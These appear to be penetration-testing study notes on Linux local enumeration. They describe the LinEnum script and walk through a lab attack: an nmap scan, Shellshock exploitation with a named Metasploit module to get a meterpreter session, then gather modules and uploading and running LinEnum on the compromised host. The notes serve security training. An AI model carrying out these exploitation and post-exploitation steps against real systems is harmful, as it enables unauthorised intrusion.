#### Automating linux local enumeration
- In addition to performing local enumeration manually,we can aslo automate the process with the help of a few scripts and MSF modules
- while local enumeration techniques/commands are important to know as a penetration tester,you will need to be time efficient.As a result you will need to learn how ot utilize various automated enumeration scripts.
- In addition to automating the process of enumeration information like system information,users & groups etc,these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation vulnerabilities,locally stored passwords etc.
#### Linux Local Enum Scripts
- LinEnum -LinEnum is a simple bash script that automates common linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.
- Github Repo: https://github.com/rebootuser/LinEnum

#### initial access
- nmap -sV 192.182.85.3
- browser the ip as apche is running
- finding cgi scripts [that's mean shellshocks vulenability]
- msfconsole [starting metasploit ]
- search shellshock
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
- set TARGETURI /gettime.cgi and everything necessary
- run 
- this give us meterpreter sessions


### Metasploit module
##### module 1
- search enum_configs [ Linux gather Configuration]
- set everything requires
-run
##### module 2
- search enum_network
- set everything requires
- run
- cat the file to see the info
##### module 3
- search enum_system [ this give system info]
- set everything requires including session
##### module 4
- search checkvm
- set session and everything requires


##### Scripts
- back to meterpreter session
- from attacker machine copy the raw content of LinEnum.sh file from the github
- (ctrl + shift + alt) to show the clipboard
- paste the raw content
- open an editor and paste the raw file and save it with sh extension.
- upload  LinEnum.sh [ upload the script file into temp directory using meterpreter session]
- shell [ to get a shell ]
- /bin/bash -i [ getting meterpreter shell ]
- chmod +x LinEnum.sh [ give executable permission ]
- ./LinEnum.sh [ this will run the scripts ]
-
